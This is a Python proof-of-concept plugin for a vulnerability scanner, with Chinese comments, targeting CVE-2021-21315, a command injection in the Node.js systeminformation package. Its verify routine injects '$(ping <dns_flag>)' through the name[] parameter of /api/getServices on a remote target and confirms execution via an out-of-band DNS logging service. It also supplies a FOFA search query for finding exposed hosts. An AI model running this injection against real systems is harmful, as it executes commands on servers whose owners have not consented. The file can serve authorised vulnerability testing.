# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,verify_ceye_dns,get_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Node.js命令注入漏洞（CVE-2021-21315）",                        # 漏洞名称
        "VulnID" : "CVE-2021-21315",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Node.js",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Node.js-systeminformation是用于获取各种系统信息的Node.JS模块，
            它包含多种轻量级功能，可以检索详细的硬件和系统相关信息。
            自发布至今，systeminformation软件包下载次数近3400万。
            
            2021年02月24日，npm团队发布安全公告，
            Node.js库中的systeminformation软件包中存在一个命令注入漏洞（CVE-2021-21315），
            其CVSSv3评分为7.8。攻击者可以通过在未经过滤的参数中注入Payload来执行系统命令。
            
            目前该漏洞已经在5.3.1版本中修复。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Node.js"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]
        
        url = self.target + "/api/getServices?name[]=$({cmd})".format(cmd = "ping%20" + dns_flag) # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            flager = verify_ceye_dns(dns_flag)
            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()